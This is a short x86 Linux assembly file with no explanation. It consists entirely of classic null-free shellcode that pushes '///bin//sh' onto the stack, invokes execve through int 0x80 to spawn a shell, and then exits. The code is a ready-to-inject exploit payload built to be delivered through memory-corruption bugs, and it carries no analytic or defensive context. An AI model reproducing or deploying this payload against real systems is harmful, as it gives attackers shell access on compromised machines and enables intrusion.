section .text
        global _start
_start:
cdq
push   edx
push   0x68732f2f
push   0x2f2f6e69
push   0x622f2f2f
mov    ebx, esp
mov    ecx, edx
mov    eax, edx
mov    al, 0xb
int    0x80
xor    eax, eax
inc    eax
int    0x80
